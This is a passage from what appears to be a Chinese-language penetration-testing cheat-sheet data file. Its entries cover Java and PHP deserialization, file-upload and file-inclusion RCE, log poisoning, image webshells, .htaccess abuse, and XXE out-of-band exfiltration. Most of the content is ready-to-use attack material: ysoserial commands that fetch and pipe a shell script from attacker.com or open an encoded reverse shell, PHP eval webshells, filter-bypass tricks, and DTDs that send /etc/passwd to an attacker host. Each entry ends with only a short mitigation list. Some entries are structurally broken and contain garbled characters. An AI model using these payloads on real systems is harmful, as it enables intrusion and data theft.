      vulnerability: 'PHP反序列化利用链：unserialize()触发__wakeup()或反序列化后触发__destruct()，通过修改对象属性指向其他类的方法(POP链)，最终调用命令执行函数。常见利用框架包括Laravel(PendingBroadcast链)、Yii(BatchQueryResult链)等。',
      exploitation: '完�利用流程：\n1. 找到unserialize调用点\n2. 分析可利用的类\n3. 构造POP链\n4. 生成序列化payload\n5. 发送触发RCE',
      mitigation: '防御措施：\n1. 避免反序列化用户输入\n2. 使用json_encode替代\n3. 白名单类限制\n4. 禁用Phar',
      difficulty: 'advanced'
    }
  },
  {
    id: 'rce-deserialize-java',
    name: 'Java反序列化',
    description: 'Java反序列化漏�利用技术',
    category: 'RCE远程代码执行',
    subCategory: 'Java反序列化',
    tags: ['rce', 'java', 'deserialize', 'ysoserial'],
    prerequisites: ['存在Java反序列化点', '存在Gadget链'],
    execution: [
      { 
        title: '1. 常见Gadget链', 
        command: 'CommonsCollections - Apache Commons Collections\nCommonsBeanutils - Apache Commons BeanUtils\nSpring - Spring Framework\nJdk7u21 - JDK原生Gadget\nGroovy - Apache Groovy\nHibernate - Hibernate ORM',
        syntaxBreakdown: [
          { part: 'CommonsCollections', explanation: 'Apache CC库Gadget链，最经典的Java反序列化利用链', type: 'command' },
          { part: 'CommonsBeanutils', explanation: 'Apache BeanUtils Gadget，利用属性访问触发执行', type: 'command' },
          { part: 'Jdk7u21', explanation: 'JDK原生Gadget，无需第三方依赖，利用AnnotationInvocationHandler', type: 'command' },
          { part: 'Hibernate', explanation: 'Hibernate ORM Gadget，利用HQL查询触发代码执行', type: 'command' }
        ], 
        description: '常见Gadget链', 
        platform: 'all'
      },
      { 
        title: '2. 使用ysoserial', 
        command: '# 列出所有Gadget\njava -jar ysoserial.jar\n\n# 生成payload\njava -jar ysoserial.jar CommonsCollections1 "curl attacker.com/shell.sh|bash" > payload.ser\njava -jar ysoserial.jar CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ==}|{base64,-d}|{bash,-i}"',
        syntaxBreakdown: [
          { part: 'java -jar ysoserial.jar', explanation: '运行ysoserial反序列化payload生成工具', type: 'command' },
          { part: 'CommonsCollections1', explanation: '指定使用的Gadget链名称', type: 'parameter' },
          { part: '"curl attacker.com/shell.sh|bash"', explanation: '要执行的系统命令（反弹Shell常用）', type: 'value' },
          { part: '> payload.ser', explanation: '将生成的序列化数据保存为二进制文件', type: 'operator' },
          { part: '{echo,BASE64}|{base64,-d}|{bash,-i}', explanation: 'Bash花括号扩展绕过空格和特殊字符限制', type: 'value' }
        ], 
        description: '使用ysoserial生成payload', 
        platform: 'all'
      },
      { 
        title: '3. JRMP攻击', 
        command: '# 启动JRMP服务\njava -cp ysoserial.jar ysoserial.exploit.JRMPListener 4444 CommonsCollections1 "touch /tmp/pwned"\n\n# 发送JRMP客户端payload\njava -jar ysoserial.jar JRMPClient attacker:4444',
        syntaxBreakdown: [
          { part: 'ysoserial.exploit.JRMPListener', explanation: '启动JRMP恶意服务端，等待目标连接', type: 'command' },
          { part: '4444', explanation: 'JRMP监听端口', type: 'value' },
          { part: 'CommonsCollections1', explanation: '服务端返回给客户端的Gadget链类型', type: 'parameter' },
          { part: 'JRMPClient', explanation: '生成JRMP客户端payload，目标反序列化后连接攻击者', type: 'command' }
        ], 
        description: 'JRMP攻击', 
        platform: 'all'
      },
      { 
        title: '4. 内存马注入', 
        command: '# 使用ysoserial注入内存马\njava -jar ysoserial.jar CommonsCollections1 "生成内存马字节码"\n\n# 或使用工具\njava -jar ysuserial.jar CommonsCollections1 "内存马命令"',
        syntaxBreakdown: [
          { part: '内存马', explanation: '无文件WebShell，注入到JVM内存中的Servlet/Filter/Listener', type: 'command' },
          { part: '字节码', explanation: '编译后的Java类字节码，运行时动态加载', type: 'parameter' },
          { part: 'CommonsCollections1', explanation: '利用CC链触发ClassLoader加载恶意字节码', type: 'value' }
        ], 
        description: '内存马注入', 
        },
      ],
    wafBypass: [
      { 
        title: '二次反序列化', 
        command: '使用SignedObject或RMI绕过黑名单',
        syntaxBreakdown: [
          { part: 'SignedObject', explanation: 'JDK内置类，包装另一个序列化对象绕过黑名单检测', type: 'command' },
          { part: 'RMI', explanation: '远程方法调用，通过网络传输序列化对象绕过本地检测', type: 'command' }
        ], 
        description: '二次反序列化绕过', 
        platform: 'all'
      },
      { 
        title: '反射绕过', 
        command: '使用反射设置属性绕过限制',
        syntaxBreakdown: [
          { part: '反射', explanation: 'Java反射机制在运行时动态修改对象属性绕过限制', type: 'command' },
          { part: 'setAccessible(true)', explanation: '突破private访问限制，修改私有字段值', type: 'parameter' }
        ], 
        description: '反射绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'Java反序列化是最具破坏力的漏洞类型之一，利用Apache Commons Collections/BeanUtils等库中的Gadget链，在ObjectInputStream.readObject()时触发任意代码执行。',
      vulnerability: 'Java反序列化利用ysoserial等工具生成Gadget链：CommonsCollections系列(InvokerTransformer链)、CommonsBeanutils(BeanComparator链)、URLDNS(DNS探测)等。序列化数据(AC ED 00 05魔术字节)出现在Cookie/HTTP参数/JMX/RMI等位置。',
      exploitation: '完�利用流程：\n1. 识别反序列化点\n2. 检测依赖库\n3. 选择合适的Gadget链\n4. 生成payload\n5. 发送触发RCE',
      mitigation: '防御措施：\n1. 升级依赖库版本\n2. 使用ObjectInputFilter\n3. 白名单类限制\n4. 禁用反序列化',
      difficulty: 'advanced'
    }
  },
  {
    id: 'rce-file-upload',
    name: '文件上传漏�',
    description: '利用文件上传漏�获取RCE',
    category: 'RCE远程代码执行',
    subCategory: '文件上传',
    tags: ['rce', 'upload', 'webshell', 'file'],
    prerequisites: ['存在文件上传功能', '可上传可执行文件'],
    execution: [
      { 
        title: '1. 基础上传', 
        command: '上传PHP文件: shell.php\n上传JSP文件: shell.jsp\n上传ASPX文件: shell.aspx\n上传CGI文件: shell.cgi',
        syntaxBreakdown: [
          { part: 'shell.php', explanation: 'PHP WebShell文件，服务器会直接解析执行', type: 'value' },
          { part: 'shell.jsp', explanation: 'Java WebShell，运行在Tomcat/JBoss等容器', type: 'value' },
          { part: 'shell.aspx', explanation: '.NET WebShell，运行在IIS服务器', type: 'value' }
        ], 
        description: '�接上传可执行文件', 
        platform: 'all'
      },
      { 
        title: '2. 前端绕过', 
        command: '# 修改Content-Type\nContent-Type: image/jpeg\n\n# 修改文件扩展名\ntest.php -> test.jpg.php\ntest.php -> test.php.jpg\n\n# 使用空字节\ntest.php%00.jpg',
        syntaxBreakdown: [
          { part: 'Content-Type: image/jpeg', explanation: '修改MIME类型欺骗前端/后端验证', type: 'parameter' },
          { part: 'test.php.jpg', explanation: '双后缀名，部分服务器从左到右解析取第一个', type: 'value' },
          { part: 'test.php%00.jpg', explanation: '空字节截断（PHP<5.3.4），%00后的内容被忽略', type: 'value' }
        ], 
        description: '绕过前端验证', 
        platform: 'all'
      },
      { 
        title: '3. 后端绕过', 
        command: '# 黑名单绕过\n.php -> .phtml, .php3, .php5, .pht\n.asp -> .asa, .cer, .cdx\n.jsp -> .jspx, .jspf\n\n# 大小写绕过\n.Php, .pHp, .PHP\n\n# 双写绕过\n.pphphp',
        syntaxBreakdown: [
          { part: '.phtml, .php3, .php5, .pht', explanation: 'PHP的替代扩展名，不在常见黑名单中', type: 'value' },
          { part: '.Php, .pHp', explanation: '大小写混合绕过Windows不区分大小写的文件系统', type: 'value' },
          { part: '.pphphp', explanation: '双写绕过，后端删除php后剩余拼接为.php', type: 'value' }
        ], 
        description: '绕过后端黑名单', 
        platform: 'all'
      },
      { 
        title: '4. 图片马', 
        command: '# 制作图片马\ncopy test.jpg/b + shell.php/a shell.jpg\n\n# 利用文件包含执行\ninclude($_GET[\'file\']);\n?file=upload/shell.jpg',
        description: '制作图片马', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: '制作图片马\ncopy', explanation: '关键参数', type: 'value' },
          { part: 'test.jpg/b', explanation: '关键参数', type: 'value' },
          { part: 'shell.php/a', explanation: '关键参数', type: 'value' }
        ]
      },
      { 
        title: '5. .htaccess上传', 
        command: '# 上传.htaccess文件\nAddType application/x-httpd-php .jpg\nAddHandler php-script .jpg\n\n# 之后上传的jpg文件会被当作PHP执行',
        syntaxBreakdown: [
          { part: 'AddType application/x-httpd-php .jpg', explanation: '让Apache将.jpg文件当作PHP脚本解析', type: 'command' },
          { part: 'AddHandler php-script .jpg', explanation: '另一种配置方式，为.jpg添加PHP处理器', type: 'command' }
        ], 
        description: '利用.htaccess', 
        platform: 'linux'
      }
    ],
    wafBypass: [
      { 
        title: 'Content-Type绕过', 
        command: '修改请求中的Content-Type为允许的类型\nimage/jpeg, image/png, image/gif',
        syntaxBreakdown: [
          { part: 'Content-Type', explanation: 'HTTP请求头中的MIME类型字段', type: 'parameter' },
          { part: 'image/jpeg', explanation: '伪装为JPEG图片的MIME类型绕过服务端检测', type: 'value' },
          { part: 'image/png, image/gif', explanation: '其他常见的白名单MIME类型', type: 'value' }
        ], 
        description: 'Content-Type绕过', 
        platform: 'all'
      },
      { 
        title: '文件�绕过', 
        command: '在恶意文件前添加图片文件�\nGIF89a<?php eval($_POST[cmd]);?>',
        syntaxBreakdown: [
          { part: 'GIF89a', explanation: 'GIF文件魔术头（文件签名），6字节', type: 'command' },
          { part: '<?php eval([cmd]);?>', explanation: '在文件头之后追加PHP代码', type: 'value' }
        ], 
        description: '文件�绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: '文件上传RCE通过上传包含恶意代码的文件(WebShell)到服务器的Web可访问目录，然后通过HTTP请求访问该文件触发代码执行，是获取服务器权限最直接的方式之一。',
      vulnerability: '文件上传RCE的利用条件：1)服务器允许上传可执行文件(PHP/JSP/ASP) 2)上传目录在Web根目录下且可通过URL访问 3)服务器将上传文件以脚本方式解析。绕过手段包括后缀名变形、Content-Type篡改、路径穿越等。',
      exploitation: '完�利用流程：\n1. 分析上传限制\n2. 选择绕过方法\n3. 上传WebShell\n4. 访问执行\n5. 获取服务器权限',
      mitigation: '防御措施：\n1. 白名单验证扩展名\n2. 检查文件内容\n3. 重命名上传文件\n4. 存储到非Web目录\n5. 禁用执行权限',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'rce-include',
    name: '文件包含RCE',
    description: '利用文件包含漏�实现RCE',
    category: 'RCE远程代码执行',
    subCategory: '文件包含',
    tags: ['rce', 'include', 'lfi', 'rfi'],
    prerequisites: ['存在文件包含漏�', '可包含恶意文件'],
    execution: [
      { 
        title: '1. 日志投毒', 
        command: '# 注入代码到日志\nUser-Agent: <?php system($_GET[\'cmd\']);?>\n\n# 包含日志文件\n?file=/var/log/apache2/access.log&cmd=whoami\n?file=/var/log/nginx/access.log&cmd=whoami', 
        description: '日志投毒RCE', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: '/var/log/apache2/access.log', explanation: 'Apache访问日志' },
          { part: '/var/log/nginx/access.log', explanation: 'Nginx访问日志' }
        ]
      },
      { 
        title: '2. Session文件包含', 
        command: '# 注入代码到Session\n?file=/var/lib/php/sessions/sess_[PHPSESSID]\n\n# Session内容\n<?php system($_GET[\'cmd\']);?>',
        description: 'Session文件包含', 
        platform: 'linux'
      },
      { 
        title: '3. /proc/self/environ', 
        command: '# 注入代码到环境变量\nUser-Agent: <?php system($_GET[\'cmd\']);?>\n\n# 包含环境变量文件\n?file=/proc/self/environ&cmd=whoami',
        description: '包含环境变量', 
        platform: 'linux'
      },
      { 
        title: '4. PHP伪协议', 
        command: '# php://input\n?file=php://input\nPOST: <?php system(\'whoami\');?>\n\n# data://协议\n?file=data://text/plain,<?php system(\'whoami\');?>\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==',
        description: 'PHP伪协议利用', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'system()', explanation: '执行系统命令', type: 'function' },
          { part: 'base64', explanation: 'Base64编码', type: 'encoding' },
          { part: 'php://input', explanation: 'PHP原始输入流', type: 'technique' }
        ]
      },
      { 
        title: '5. 远程文件包含', 
        command: '# RFI�接包含远程Shell\n?file=http://attacker.com/shell.txt\n\n# shell.txt内容\n<?php system($_GET[\'cmd\']);?>',
      }
    ],
    wafBypass: [
      { 
        title: '编码绕过', 
        command: '?file=%2fvar%2flog%2fapache2%2faccess.log\nURL编码路径',
            syntaxBreakdown: [
              { part: '?file=%2fvar%2flog%2fapache2%2faccess.log\nURL编码路径', explanation: '攻击载荷', type: 'value' }
            ],
        description: 'URL编码绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: '文件包含RCE将LFI/RFI漏洞升级为代码执行，通过包含日志文件、Session文件、/proc/self/environ、临时上传文件等方式注入并执行恶意PHP代码。',
      vulnerability: '文件包含RCE的多种利用路径：1)日志投毒(User-Agent注入PHP代码→包含access.log) 2)Session文件包含(注入代码到Session→包含/tmp/sess_xxx) 3)/proc/self/environ中的User-Agent 4)PHP临时上传文件竞争条件。',
      exploitation: '完�利用流程：\n1. 发现文件包含点\n2. 注入恶意代码\n3. 包含恶意文件\n4. 执行系统命令\n5. 获取Shell',
      mitigation: '防御措施：\n1. 白名单验证文件路径\n2. 禁用远程文件包含\n3. 禁用PHP伪协议\n4. 使用open_basedir限制',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'rce-log-poison',
    name: '日志投毒RCE',
    description: '利用日志投毒实现RCE',
    category: 'RCE远程代码执行',
    subCategory: '日志投毒',
    tags: ['rce', 'log', 'poison', 'lfi'],
    prerequisites: ['存在文件包含漏�', '可读取日志文件'],
    execution: [
      { 
        title: '1. Apache日志投毒', 
        command: '# 注入代码到访问日志\ncurl -A "<?php system(\$_GET[\'cmd\']);?>" http://target/\n\n# 包含日志执行\n?file=/var/log/apache2/access.log&cmd=whoami\n?file=/var/log/httpd/access_log&cmd=whoami', 
        description: 'Apache日志投毒', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: '/var/log/apache2/access.log', explanation: 'Debian/Ubuntu日志路径' },
          { part: '/var/log/httpd/access_log', explanation: 'CentOS/RHEL日志路径' }
        ]
      },
      { 
        title: '2. Nginx日志投毒', 
        command: '# 注入代码\ncurl -A "<?php system(\$_GET[\'cmd\']);?>" http://target/\n\n# 包含日志\n?file=/var/log/nginx/access.log&cmd=whoami',
        },
      ],
    wafBypass: [
      { 
        title: '编码绕过', 
        command: '使用URL编码或Base64编码绕过关键字过滤',
            syntaxBreakdown: [
              { part: '使用URL编码或Base64编码绕过关键字过滤', explanation: '攻击载荷', type: 'value' }
            ],
        description: '编码绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: '日志投毒RCE是最可靠的LFI→RCE升级路径之一：向Web服务器日志注入PHP代码(通过请求头)，然后通过文件包含漏洞加载日志文件触发代码执行，适用于Apache/Nginx等主流Web服务器。',
      vulnerability: '日志投毒的注入点：1)Apache access.log中的User-Agent/Referer字段 2)Nginx access.log 3)错误日志error.log(故意触发包含不存在文件的错误) 4)FTP日志(vsftpd) 5)SSH日志(/var/log/auth.log)中的用户名字段。',
      exploitation: '完�利用流程：\n1. 发现文件包含漏�\n2. 确定日志文件路径\n3. 注入恶意代码到日志\n4. 包含日志文件\n5. 执行命令获取Shell',
      mitigation: '防御措施：\n1. 限制日志文件访问\n2. 过滤日志中的特殊字符\n3. 禁用文件包含\n4. 使用open_basedir限制',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'rce-image',
    name: '图片马RCE',
    description: '利用图片马实现RCE',
    category: 'RCE远程代码执行',
    subCategory: '图片马',
    tags: ['rce', 'image', 'webshell', 'upload'],
    prerequisites: ['存在文件上传', '存在文件包含'],
    execution: [
      { 
        title: '1. 制作图片马', 
        command: '# Windows\ncopy test.jpg/b + shell.php/a shell.jpg\n\n# Linux\ncat test.jpg shell.php > shell.jpg\n\n# 在图片末尾添加PHP代码\necho "<?php @eval($_POST[cmd]);?>" >> test.jpg',
        syntaxBreakdown: [
          { part: 'copy test.jpg/b + shell.php/a', explanation: 'Windows下将图片和PHP代码二进制合并', type: 'command' },
          { part: 'cat test.jpg shell.php > shell.jpg', explanation: 'Linux下拼接图片和PHP代码', type: 'command' },
          { part: 'echo "<?php ...?>" >> test.jpg', explanation: '在图片末尾追加PHP代码', type: 'command' }
        ], 
        description: '制作图片马', 
        platform: 'all'
      },
      { 
        title: '2. 图片马内容', 
        command: 'GIF89a\n<?php @eval($_POST[cmd]);?>\n\n# 或使用Exif注释\nexiftool -Comment="<?php @eval($_POST[cmd]);?>" test.jpg',
        syntaxBreakdown: [
          { part: 'GIF89a', explanation: 'GIF文件头魔术字节，用于通过文件头检测', type: 'command' },
          { part: '<?php @eval($_POST[cmd]);?>', explanation: '一句话木马，@抑制错误信息', type: 'value' },
          { part: 'exiftool -Comment=', explanation: '将PHP代码写入图片EXIF注释字段，更隐蔽', type: 'command' }
        ], 
        description: '图片马格式', 
        platform: 'all'
      },
      { 
        title: '3. 利用文件包含执行', 
        command: '# 配合文件包含漏�\n?file=upload/shell.jpg\nPOST: cmd=system(\'whoami\');\n\n# 配合phar://\n?file=phar://upload/shell.jpg',
        description: '文件包含执行', 
        platform: 'all'
      },
      { 
        title: '4. 配合.htaccess', 
        command: '# 上传.htaccess\nAddType application/x-httpd-php .jpg\n\n# �接访问图片执行\nhttp://target/upload/shell.jpg',
        syntaxBreakdown: [
          { part: 'AddType application/x-httpd-php .jpg', explanation: 'Apache配置将.jpg按PHP解析', type: 'command' },
          { part: 'http://target/upload/shell.jpg', explanation: '直接访问图片触发PHP执行，无需文件包含', type: 'value' }
        ], 
        description: '配合.htaccess执行', 
        platform: 'linux'
      }
    ],
    wafBypass: [
      { 
        title: '文件�伪装', 
        command: '使用真实图片文件�\n确保图片可正常预览',
        syntaxBreakdown: [
          { part: '真实图片文件头', explanation: '使用完整的图片文件头（如JPEG的FF D8 FF E0）', type: 'command' },
          { part: '可正常预览', explanation: '确保图片能正常打开显示，避免文件完整性检查失败', type: 'parameter' }
        ], 
        description: '文件�伪装', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: '图片RCE利用图片处理库(ImageMagick/GD/Pillow)的漏洞或特性在服务器处理上传图片时执行代码。ImageMagick的"ImageTragick"(CVE-2016-3714)是最著名的案例。',
      vulnerability: 'ImageMagick利用delegate(委托处理器)执行外部命令：MVG格式中的push graphic-context指令、SVG中的xlink:href外部引用、ephemeral协议删除文件、MSL格式写入文件等。GD库的特定版本也存在堆溢出等漏洞。',
      exploitation: '完�利用流程：\n1. 制作图片马\n2. 上传图片马\n3. 找到文件包含点\n4. 包含图片马执行代码\n5. 获取Shell',
      mitigation: '防御措施：\n1. 检查文件完�内容\n2. 重绘图片去除恶意代码\n3. 禁用文件包含\n4. 存储到非Web目录',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'rce-htaccess',
    name: '.htaccess利用',
    description: '利用.htaccess文件实现RCE',
    category: 'RCE远程代码执行',
    subCategory: '.htaccess',
    tags: ['rce', 'htaccess', 'apache', 'upload'],
    prerequisites: ['Apache服务器', '可上传.htaccess'],
    execution: [
      { 
        title: '1. 解析其他扩展名', 
        command: '# 让.jpg文件作为PHP执行\nAddType application/x-httpd-php .jpg\nAddHandler php-script .jpg\n\n# 让.txt文件作为PHP执行\nAddType application/x-httpd-php .txt', 
        description: '修改文件类型解析', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'AddType', explanation: '设置MIME类型' },
          { part: 'AddHandler', explanation: '设置处理程序' }
        ]
      },
      { 
        title: '2. 自动包含', 
        command: '# 自动在每个文件前包含\nphp_value auto_prepend_file /var/www/html/shell.php\n\n# 自动在每个文件后包含\nphp_value auto_append_file /var/www/html/shell.php',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' 自动在每个文件前包含\nphp_value auto_prepend_file /var/www/html/shell.php\n\n# 自动在每个文件后包含\nphp_value auto_append_file /var/www/html/shell.php', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '自动包含文件', 
        platform: 'linux'
      },
      { 
        title: '3. 伪静态RCE', 
        command: '# 利用mod_rewrite\nRewriteEngine on\nRewriteRule ^(.*)$ $1 [L]\n\n# �危险的配置\nSetHandler application/x-httpd-php',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' 利用mod_rewrite\nRewriteEngine on\nRewriteRule ^(.*)$ $1 [L]\n\n# �危险的配置\nSetHandler application/x-httpd-php', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '伪静态配置', 
        platform: 'linux'
      },
      { 
        title: '4. 错误页面包含', 
        command: '# 自定义错误页面\nErrorDocument 404 /shell.php\nErrorDocument 500 /shell.php',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' 自定义错误页面\nErrorDocument 404 /shell.php\nErrorDocument 500 /shell.php', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '错误页面利用', 
        platform: 'linux'
      },
      { 
        title: '5. 文件包含绕过', 
        command: '# 设置include路径\nphp_value include_path "/var/www/html/uploads"\n\n# 禁用安全限制\nphp_flag safe_mode off\nphp_flag display_errors on',
            syntaxBreakdown: [
              { part: '# 设置include路径\nphp_value include_path "/var/www/html/uploads"\n\n# 禁用安全限制\nphp_f', explanation: '攻击载荷', type: 'value' }
            ],
        description: 'PHP配置修改', 
        platform: 'linux'
      }
    ],
    wafBypass: [
      { 
        title: '换行绕过', 
        command: '使用换行符分隔配置\n绕过单行检测',
            syntaxBreakdown: [
              { part: '使用换行符分隔配置\n绕过单行检测', explanation: '攻击载荷', type: 'value' }
            ],
        description: '换行绕过', 
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: '.htaccess文件RCE通过上传或修改Apache的.htaccess配置文件，改变服务器对特定文件类型的处理方式(如将.jpg文件作为PHP解析)，或直接通过php_value注入PHP代码。',
      vulnerability: '.htaccess RCE方式：1)AddType application/x-httpd-php .jpg使图片文件被当作PHP解析 2)php_value auto_prepend_file配合php://input注入代码 3)SetHandler将目录所有文件作为PHP处理 4)php_flag engine配合.user.ini。',
      exploitation: '完�利用流程：\n1. 上传恶意.htaccess\n2. 配置文件类型解析\n3. 上传伪装的WebShell\n4. 访问执行\n5. 获取服务器权限',
      mitigation: '防御措施：\n1. 禁止上传.htaccess\n2. 禁用AllowOverride\n3. 白名单验证文件名\n4. 重命名上传文件',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'xxe-blind',
    name: '盲注XXE攻击',
    description: '无回显的XXE攻击技术',
    category: 'XXE实体注入',
    subCategory: '盲注XXE',
    tags: ['xxe', 'blind', 'oob', 'xml'],
    prerequisites: ['存在XML解析', '无�接回显'],
    execution: [
      { 
        title: '1. 外部实体探测', 
        command: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "http://attacker.com/xxe">\n]>\n<foo>&xxe;</foo>', 
        description: '使用外部实体探测', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'DOCTYPE', explanation: '文档类型声明' },
          { part: 'ENTITY', explanation: '定义实体' },
          { part: 'SYSTEM', explanation: '外部系统资源' },
          { part: '&xxe;', explanation: '引用实体' }
        ]
      },
      { 
        title: '2. 参数实体', 
        command: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">\n%xxe;\n]>\n<foo>test</foo>', 
        description: '使用参数实体', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '%', explanation: '参数实体标识符' },
          { part: '%xxe;', explanation: '引用参数实体' }
        ]
      },
      { 
        title: '3. OOB外带数据', 
        command: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">\n%xxe;\n]>\n<foo>test</foo>\n\n# xxe.dtd内容\n<!ENTITY % file SYSTEM "file:///etc/passwd">\n<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?d=%file;\'>">\n%eval;\n%exfil;',
        description: 'OOB外带文件内容', 
        syntaxBreakdown: [
          { part: '<!DOCTYPE>', explanation: '文档类型声明', type: 'tag' },
          { part: '<!ENTITY>', explanation: '实体定义', type: 'tag' },
          { part: 'SYSTEM', explanation: '外部实体引用', type: 'keyword' },
          { part: 'file://', explanation: '本地文件协议', type: 'technique' }
        ]
        },
      ],
    wafBypass: [
      { 
        title: '编码绕过', 
        command: '使用UTF-16编码XML文档\n绕过WAF检测',
            syntaxBreakdown: [
              { part: '使用UTF-16编码XML文档\n绕过WAF检测', explanation: '攻击载荷', type: 'value' }
            ],
        description: '编码绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'Blind XXE是指XML外部实体注入成功但响应中不直接显示实体内容的场景，需要通过带外(OOB)数据外泄技术将读取的文件内容通过HTTP/DNS等方式发送到攻击者控制的服务器。',
      vulnerability: 'Blind XXE利用参数实体(%entity)和外部DTD实现数据外泄：在外部DTD中定义嵌套实体引用，将文件内容拼接到HTTP请求URL中发送到攻击者服务器。部分XML解析器限制了实体嵌套，需使用不同的外泄策略。',
      exploitation: '完�利用流程：\n1. 确认XXE存在\n2. 使用参数实体\n3. 构造OOB外带\n4. 获取敏感数据',
      mitigation: '防御Blind XXE：禁用XML外部实体和DTD处理(最有效)，使用JSON代替XML格式，配置网络层出站流量白名单阻止OOB数据外泄，部署WAF检测DTD声明和实体引用，监控DNS/HTTP异常外联请求。',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'xxe-oob',
    name: 'XXE OOB外带攻击',
    description: '利用OOB技术外带XXE数据',
    category: 'XXE实体注入',
    subCategory: 'OOB外带',
    tags: ['xxe', 'oob', 'exfiltration', 'xml'],
    prerequisites: ['存在XXE漏�', '可发起外部请求'],
    execution: [
      { 
        title: '1. HTTP外带', 
        command: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">\n%xxe;\n]>\n<foo></foo>\n\n# evil.dtd\n<!ENTITY % file SYSTEM "file:///etc/passwd">\n<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/log?data=%file;\'>">\n%eval;\n%exfil;',
        syntaxBreakdown: [
          { part: '<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">', explanation: '参数实体引用远程恶意DTD文件', type: 'command' },
          { part: '%xxe;', explanation: '在DTD中展开参数实体，加载远程DTD', type: 'operator' },
          { part: '<!ENTITY % file SYSTEM "file:///etc/passwd">', explanation: '在DTD中读取目标服务器本地文件', type: 'value' },
          { part: 'http://attacker.com/log?data=%file;', explanation: '通过HTTP请求参数将文件内容外带', type: 'value' }
        ], 
        description: 'HTTP外带数据', 
        platform: 'all'
      },
      { 
        title: '2. FTP外带', 
        command: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">\n%xxe;\n]>\n<foo></foo>\n\n# evil.dtd\n<!ENTITY % file SYSTEM "file:///etc/passwd">\n<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'ftp://attacker.com/%file;\'>">\n%eval;\n%exfil;',
        syntaxBreakdown: [
          { part: 'ftp://attacker.com/%file;', explanation: '使用FTP协议外带数据，支持多行内容', type: 'command' },
          { part: '%eval;', explanation: '展开eval参数实体，动态构造外带实体', type: 'operator' },
          { part: '%exfil;', explanation: '触发外带请求，将数据发送到攻击者FTP服务器', type: 'operator' }
        ], 
        description: 'FTP外带数据', 
        platform: 'all'
      },
      { 
        title: '3. DNS外带', 
        command: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "http://attacker.com/log?file=/etc/passwd">\n]>\n<foo>&xxe;</foo>\n\n# 或使用子域名\n<!ENTITY xxe SYSTEM "http://filecontent.attacker.com/">',
        syntaxBreakdown: [
          { part: 'http://filecontent.attacker.com/', explanation: '将文件内容作为子域名通过DNS解析外带', type: 'value' },
          { part: '&xxe;', explanation: '在XML内容中引用通用实体触发请求', type: 'operator' }
        ], 
        description: 'DNS外带', 
        },
      ],
    wafBypass: [
      { 
        title: '使用CDATA', 
        command: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<foo><![CDATA[&xxe;]]></foo>',
        syntaxBreakdown: [
          { part: '<![CDATA[', explanation: 'XML CDATA段开始标记，内容不被XML解析器处理', type: 'operator' },
          { part: '&xxe;', explanation: '实体引用在CDATA之前被解析展开', type: 'variable' },
          { part: ']]>', explanation: 'CDATA段结束标记', type: 'operator' }
        ], 
        description: 'CDATA包装', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'XXE OOB(Out-of-Band)带外数据外泄是Blind XXE的核心利用技术，通过HTTP/FTP/DNS等外部通道将服务器内部数据传输到攻击者，是XXE漏洞从检测到实际数据提取的关键步骤。',
      vulnerability: 'XXE OOB通过多层参数实体嵌套实现：1)第一个实体读取目标文件 2)第二个实体(外部DTD)将文件内容拼接进HTTP URL 3)解析器请求该URL将数据发送到攻击者。FTP协议可外泄多行内容，DNS可在严格网络环境下作为隐蔽通道。',
      exploitation: '完�利用流程：\n1. 托管恶意DTD文件\n2. 构造XXE payload\n3. 触发外带请求\n4. 接收并解析数据',
      mitigation: '防御XXE OOB：完全禁用外部实体处理和DTD加载，配置严格的出站网络策略(仅允许必要的白名单出站)，监控异常DNS查询和HTTP外联请求，使用RASP检测XML解析中的文件访问和网络请求行为。',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'xxe-ssrf',
    name: 'XXE+SSRF组合攻击',
    description: '利用XXE实现SSRF攻击',
